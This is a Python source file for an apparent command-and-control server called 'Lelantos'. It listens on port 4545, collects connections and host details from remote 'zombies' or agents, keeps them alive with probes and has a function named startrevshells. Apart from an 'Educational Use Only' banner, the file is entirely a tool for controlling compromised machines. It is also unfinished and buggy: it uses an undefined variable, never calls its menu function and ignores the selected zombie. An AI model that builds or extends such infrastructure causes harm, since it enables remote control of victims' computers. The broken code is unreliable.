import socket # Socket needed for networking in python
import subprocess # System commands needed for python
import sys # Python runtime
import time # Timers etc
import threading # Runs multiple tasks
import asyncio # Many network tasks
import io # Memory text streams
import os # Interacts with OS
import psutil # System utility information
import colorama # Coloured terminal output
from colorama import Fore, Back, Style, init
import pyfiglet
exit_event = threading.Event()

init(autoreset=True)
counter=-1
clientlist=[]
clientdata=[]
automigrate=""
host = "0.0.0.0"
port = 4545

DEEP_RED = "\033[38;5;88m"
SHADOW_RED = "\033[38;5;52m"
TEXT_RED = "\033[38;5;160m"


# Function to print banner in terminal when programme runs

def print_banner():
    banner = pyfiglet.figlet_format("Lelantos", font="ansi_shadow")
    print()
    for line in banner.splitlines():
        print(DEEP_RED + line + Style.RESET_ALL)
    print(TEXT_RED + "    Educational Use Only\n" + Style.RESET_ALL)

print_banner()

# Socket set ups for host and port as well as IPV4 and TCP.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # This defines an IPV4 and TCP Socket/Endpoint
s.bind((host, port)) # This binds the socket to host and port 
s.listen(5) # Sets socket to listen. 5 connections can wait in queue before being accepted
print(Fore.GREEN + "[+] Listening on " + host + ":" + str(port) + Style.RESET_ALL) # Prints a line saying port and ip address the server is listening on

# Function used to handle multiple connections as well as the selection of a specific agent.

def server_selection():
    global clientlist
    commands = "True"

    while not "exit" in commands:
        commands=input(Fore.GREEN + "Input:" + Fore.WHITE)
        if command=="":
            pass
        if command=="zombies": # Interact with an agent
            zombies()
        if command == "cls" or command == "clear": # Clears the terminal
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        if command == "?" or command == "help": # Help Menu
            print(Fore.RED + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)

def startrevshells():
    if os.name == 'nt':
        subprocess.call(["py", "server.py"])
        exit_event.set()
    else:
        subprocess.call(["python3", "server.py"])
        exit_event.set()

## init_main_sock() is the main function

def init_main_sock():
    while True:
        conn, addr = s.accept() # Accepts a connection from a client 
        print(Fore.GREEN + f'\n[+] New Connection From: {addr[0]}:{addr[1]}' + Fore.WHITE) # Prints the IP and port 

        global counter 
        global automigrate
        counter += 1 # Increments the counter by 1
        
        # Gathers client info
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('utf-8')
        clientinfo = clientinfo.split("\n")

        # Get first item from client info (e.g. UserInfo = "John Doe's PC")
        UserInfo=clientinfo[0]
        # Print recieved client info (this is just for testing purposes, can be removed later)
        print(clientinfo)
        # Stores sumary in clientlist and adds a new item to clientlist. It stores counter, conn and userInfo
        clientlist.append([counter, conn, UserInfo])
        clientdata.append([clientinfo])

        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()

# Probe function. Determines if client is still alive.
def probe():
    while True:
        global counter
        global clientlist
        global clientdata

        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keep Alive?")
                d = d + 1
        except:
            print(
                Fore.RED + "\n [-] Client Disconnected \n************************\n" + Fore.WHITE,
                counter,
                "--> ",
                clientdata[d],
                "\n************************\n"
            )
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.RED + "[+] Removed agent" + Fore.WHITE)
        time.sleep(5) # Waits 5 seconds before sending the next keep alive message

def zombies():
    global counter
    global clientlist
    global clientdata
    selection = ""

    if (len(clientlist) <= 0):
        print(Fore.RED + "[-] No agents connected" + Fore.WHITE)
        return
    
    print (Fore.RED + "Connected Agents:\n" + Fore.WHITE)

    temp = 0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp += 1
    print(Fore.RED + "\nPick a zombie to connect too\n" + Fore.WHITE)
    
    try:
        selection = int(input( ' Enter the client: '))
    except:
        print(Fore.RED + "[-] Invalid selection" + Fore.WHITE)
        time.sleep(4)
        return
    
    
# This block of code starts the threads to keep the main programme alive 

# threading.Thread(...) Creates a new thread
# target=init_main_sock tells the thread which function to run
# daemon = True makes the programme run as background thread 
# start() Actually begins the thread 

# The line below also calls a variable (handler_thread) which is equal too threading.Thread(...) so that the thread can be referenced
handler_thread = threading.Thread(target=init_main_sock) # creates and starts threat to run the init_main_sock function
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)

